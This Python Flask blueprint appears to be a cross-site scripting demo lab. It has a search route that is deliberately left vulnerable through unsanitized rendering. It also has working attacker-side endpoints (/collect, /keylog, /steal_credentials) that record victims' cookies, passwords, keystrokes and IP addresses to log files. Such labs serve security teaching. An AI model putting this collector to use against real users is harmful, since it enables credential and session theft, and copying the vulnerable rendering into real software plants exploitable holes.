from flask import Blueprint, render_template, request, make_response, redirect, url_for, current_app
import os
import json
from datetime import datetime

xss = Blueprint(
    'xss_demo',
    __name__,
    template_folder='templates',
    static_folder='static'
)


def _log_file_path() -> str:
    # Keep log file in app root so it's easy to find/reset
    return os.path.join(current_app.root_path, 'log.txt')


@xss.route('/')
def index():
    name = request.cookies.get('name', '')
    page = request.args.get('page', '')
    error = request.args.get('error', '')

    resp = make_response(render_template('xss_demo/index.html', name=name, page=page, error=error))
    resp.set_cookie('canyouseeme', 'I am Juno_okyo')
    return resp


@xss.route('/', methods=['POST'])
def handle_post():
    name = request.form.get('name', '')
    if name:
        resp = make_response(redirect(url_for('xss_demo.index')))
        resp.set_cookie('name', name)
        return resp
    return redirect(url_for('xss_demo.index'))


@xss.route('/about')
def about():
    return render_template('xss_demo/about.html')


@xss.route('/log')
def log_get():
    c = request.args.get('c', '')
    if c:
        with open(_log_file_path(), 'a', encoding='utf-8') as f:
            f.write(c + '\n')
    return 'Logged'


@xss.route('/log', methods=['POST'])
def log_post():
    username = request.form.get('username', '')
    password = request.form.get('password', '')

    if username and password:
        log_entry = f'Username: {username} - Password: {password}'
        with open(_log_file_path(), 'a', encoding='utf-8') as f:
            f.write(log_entry + '\n')

    name = request.cookies.get('name', '')
    resp = make_response(redirect(url_for('xss_demo.index') + '?error=1'))
    if name:
        resp.set_cookie('name', name)
    return resp


@xss.route('/clear')
def clear_log():
    log_file = _log_file_path()
    if os.path.exists(log_file):
        os.remove(log_file)
    return 'Log cleared'


# --- Additional demo endpoints below ---

@xss.route('/xss-demo')
def xss_demo_page():
    return render_template('xss_demo/xss_demo.html')


@xss.route('/vulnerable-search')
def vulnerable_search():
    query = request.args.get('q', '')
    # Intentionally render unsanitized for demo; template uses |safe
    return render_template('xss_demo/search.html', query=query)


def _stolen_log_path() -> str:
    return os.path.join(current_app.root_path, 'stolen_data.jsonl')


def _append_jsonl(payload: dict) -> None:
    payload_with_ts = {**payload, 'timestamp': datetime.now().isoformat()}
    with open(_stolen_log_path(), 'a', encoding='utf-8') as f:
        f.write(json.dumps(payload_with_ts, ensure_ascii=False) + '\n')


@xss.route('/collect', methods=['POST'])
def collect_data():
    if request.is_json:
        body = request.get_json(silent=True) or {}
    else:
        # Accept form-encoded as well
        body = request.form.to_dict(flat=True)

    data = {
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'cookies': body.get('cookies', ''),
        'credentials': body.get('credentials', ''),
        'other_data': body,
        'url': body.get('url') or request.headers.get('Referer'),
    }
    _append_jsonl(data)
    return 'OK'


@xss.route('/keylog', methods=['POST'])
def keylog():
    if request.is_json:
        body = request.get_json(silent=True) or {}
    else:
        body = request.form.to_dict(flat=True)
    _append_jsonl({'type': 'keystroke', **body})
    return 'OK'


@xss.route('/steal_credentials', methods=['POST'])
def steal_credentials():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    if username or password:
        _append_jsonl({'type': 'creds', 'username': username, 'password': password})
        with open(_log_file_path(), 'a', encoding='utf-8') as f:
            f.write(f"Username: {username} - Password: {password}\n")
    return redirect(url_for('xss_demo.index') + '?error=1')


@xss.route('/log_credentials', methods=['POST'])
def log_credentials():
    # Alternative endpoint for overlay approach
    return steal_credentials()


